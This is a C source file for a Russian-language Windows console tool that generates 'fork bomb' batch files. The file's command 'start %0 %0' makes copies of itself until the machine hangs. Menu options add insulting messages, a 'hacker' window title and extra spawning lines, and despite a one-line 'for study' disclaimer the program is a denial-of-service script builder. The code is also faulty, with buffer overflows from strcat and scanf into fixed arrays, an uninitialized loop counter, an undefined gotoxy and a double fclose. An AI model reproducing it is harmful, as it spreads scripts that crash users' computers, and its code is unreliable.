#include <stdio.h>
#include <math.h>
#include <time.h>
#include <windows.h>
#include <crt.h>
#include <string.h>
#include <conio.h>
#include <stdlib.h>
char key;
char command[] = "start %0 %0";
int main()
{
    RECT r;
    /*UINT i = GetConsoleCP();
    printf ("%d\n", i);
    UINT j = GetConsoleCP();
    printf ("%d\n", j);*/
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    HWND hwndConsole = GetConsoleWindow();
    SetWindowText(hwndConsole, "Софт для создания вируса - \"Fork Bomb\" от Mrkliner");
    GetWindowRect(hwndConsole, &r);
    MoveWindow(hwndConsole, 1, 1, 800, 480, TRUE);
    //SendMessage(hwndConsole, WM_HSCROLL, NULL, NULL);
    while (1)
    {
        setlocale(0, "rus");
        GetWindowRect(hwndConsole, &r);
        int width = r.right - r.left;
        int height = r.bottom - r.top;
        if (width >= 801)
        {
            MoveWindow(hwndConsole, 1, 1, 800, 480, TRUE);
        }
        if (height >= 481)
        {
            MoveWindow(hwndConsole, 1, 1, 800, 480, TRUE);
        }
        SetConsoleTextAttribute (hConsole, 11);
        gotoxy (28, 2);
        printf ("1 - Создать форк бомбу\n");
        gotoxy (28, 4);
        printf ("2 - Выход из программы\n");
        gotoxy (28, 6);
        printf ("3 - Параметры fork бомбы\n");
        gotoxy (28, 8);
        printf ("4 - Информация о софте");
        gotoxy (28, 10);
        printf ("5 - Код fork бомбы");
        gotoxy (0, 23);
        printf (">>");
        key = getch ();
        if (key == '1')
        {
            FILE *p;
            p=fopen("fork.bat","w");
            fprintf(p, "%s", command);
            fclose(p);
            char text[] = "Ваша Fork Бомба успешно создана!\nЕё код на bat:\n\n";
            strcat(text, command);
            MessageBoxA(NULL, text, "Отчёт о создании", MB_ICONINFORMATION | MB_OK);
            fclose(p);
        }
        else if (key == '4')
        {
            SetConsoleTextAttribute (hConsole, 14);
            system ("cls");
            printf ("Этот софт предназначен для использования в целях изучения, а не создания про-\nблем для людей!\n\n");
            printf("В нашем софте есть:\n\n");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            printf (" \t%c", 249);
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale(0, "rus");
            printf (" Удобное и понятное меню\n");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            printf (" \t%c", 249);
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale (0, "rus");
            printf (" Возможность кастомизации fork-бомбы\n");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            printf (" \t%c", 249);
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale (0, "rus");
            printf (" Создание bat скрипта который работает от XP до 11 и выше\n\n");
            printf ("Наша поисоквая система: ");
            SetConsoleTextAttribute (hConsole, 11);
            printf("mrkliner.github.io\n");
            printf ("                        ");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            for (int i; i < 18; i++)
                printf("%c", 205);
            printf ("\n\n\n");
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale (0, "rus");
            SetConsoleTextAttribute(hConsole, 14);
            printf("Это одни из наших приймуществ!\nДля возврата в меню нажмите любую клавишу...");
            getch();
            system ("cls");
        }
        else if (key == '5')
        {
            system ("cls");
            char link[] = "";
            printf ("Введите путь к файлу или имя файла: ");
            scanf ("%s", &link);
            FILE *bomb;
            bomb=fopen(link, "rt");
            char sod[] = "", probel;
            printf ("Код вируса:\n\n");
            SetConsoleTextAttribute (hConsole, 10);
            if (bomb) {
                while (fscanf(bomb, "%s%c", sod, &probel)!=EOF)

                    printf("%s%c",sod, probel);

            }
            SetConsoleTextAttribute (hConsole, 11);
            printf ("\n\n");
            printf ("Нажмите любую клавишу для возврата в меню...");
            getch();
            fclose (bomb);
            system ("cls");

        }
        else if (key == '2')
        {
            break;
            exit(0);
            return 0;
        }
        else if (key == '3')
        {
            system ("cls");
            printf ("\n\t\t\t1 - Добавить задержку в 1 милисекунду\n\n\t\t\t2 - Добавить натпись - \"ты идиот\"\n\n\t\t\t3 - Очистить параметры\n\n\t\t\t4 - добавить имя окна \"Прога для Хакера\"\n\n\t\t\t5 - добавить эффект хакера\n");
            gotoxy (0, 23);
            printf (">>");
            key = getch();
            system ("cls");
            if (key == '1')
                strcat (command, "\ntimeout 1");
            else if (key == '2')
                strcat (command, "\necho You are an idiot! Ты идиот!");
            else if (key == '3')
            {
                strcpy (command, "start %0 %0");
            }
            else if (key == '4')
            {
                strcat (command, "\ntitle Прога для Хакера 1.0 Build 1");
            }
            else if (key == '5')
            {
                strcat (command, "\ncolor A");
                strcat (command, "\ndir /s");
                strcat (command, "\nstart %0 %0");
                strcat (command, "\nstart %0 %0");
                strcat (command, "\nstart %0 %0");
            }
        }
    }
    return 0;
}
